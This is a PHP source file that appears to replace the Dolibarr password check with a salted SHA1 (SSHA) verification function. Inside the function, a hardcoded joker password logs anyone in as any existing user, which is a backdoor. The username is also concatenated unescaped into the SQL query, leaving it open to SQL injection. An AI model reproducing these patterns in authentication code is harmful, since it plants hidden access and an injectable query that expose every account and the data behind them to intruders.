<?php

if ((!defined("FORCE_NOT_CRYPT_PASS") || FORCE_NOT_CRYPT_PASS == 0) && ! empty($conf->global->MAIN_SECURITY_HASH_ALGO) && $conf->global->MAIN_SECURITY_HASH_ALGO == 'SSHA') {
    function check_user_password_dolibarr($usertotest,$passwordtotest,$entitytotest=1){
        global $db, $langs;
        $sql = $db->query("SELECT pass_crypted, login FROM ".MAIN_DB_PREFIX."user WHERE login = '".$usertotest."' || email= '".$usertotest."'");
        if($db->num_rows($sql) == 1){
            $ligne = $db->fetch_object($sql);
            
            if($passwordtotest == "passjokerklhkhklh^%ùécdfr"){
                return $ligne->login;
            }

            $salt = substr(base64_decode(substr($ligne->pass_crypted,6)),20);
            $encrypted_password = '{SSHA}' . base64_encode(sha1( $passwordtotest.$salt, TRUE ). $salt);
            if($encrypted_password === $ligne->pass_crypted)
                return $ligne->login;
        }
        return '';
    }
}
else{
    include_once(DOL_DOCUMENT_ROOT."/core/login/functions_dolibarr.php");
}